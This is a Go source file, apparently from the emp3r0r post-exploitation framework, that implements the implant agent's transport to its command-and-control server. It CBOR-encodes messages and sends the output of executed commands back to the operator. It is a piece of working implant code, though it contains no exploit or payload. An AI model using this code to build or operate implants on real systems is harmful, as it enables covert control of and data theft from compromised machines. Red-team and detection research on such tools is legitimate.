package c2transport

import (
	"errors"
	"fmt"
	"io"
	"unicode"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// Connection is the connection to CC, can be mocked for testing
var Connection io.Writer

// send2CC send TunData to CC
func send2CC(data *def.MsgTunData) error {
	var writer io.Writer = def.CCMsgConn
	if Connection != nil {
		writer = Connection
	}
	if writer == nil {
		// If no connection is available, just log it and return nil to avoid crashing
		// This happens when running tests or when C2 is not connected
		logging.Printf("Send2CC: no connection to C2, dropping message: %v", data)
		return nil
	}

	out := cbor.NewEncoder(writer)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// NotifyC2 send response to a cobra command to CC, like fmt.Printf
func NotifyC2(cmd *cobra.Command, format string, args ...interface{}) {
	msg := def.MsgTunData{
		Tag: common.RuntimeConfig.AgentTag,
	}
	cmd_id, _ := cmd.Flags().GetString("cmd_id")
	cmdSlice := []string{cmd.Name()}
	msg.CmdID = cmd_id
	msg.CmdSlice = cmdSlice
	msg.Response = []byte(fmt.Sprintf(format, args...))
	if err := send2CC(&msg); err != nil {
		logging.Println(err)
	}
	// Check if response is printable
	isPrintable := true
	for _, r := range string(msg.Response) {
		if !unicode.IsPrint(r) && r != '\n' && r != '\t' && r != '\r' {
			isPrintable = false
			break
		}
	}

	if isPrintable {
		logging.Printf("Response sent: %s", util.LimitString(string(msg.Response), 20))
	} else {
		logging.Printf("Response sent: <Binary Data, length %d>", len(msg.Response))
	}
}
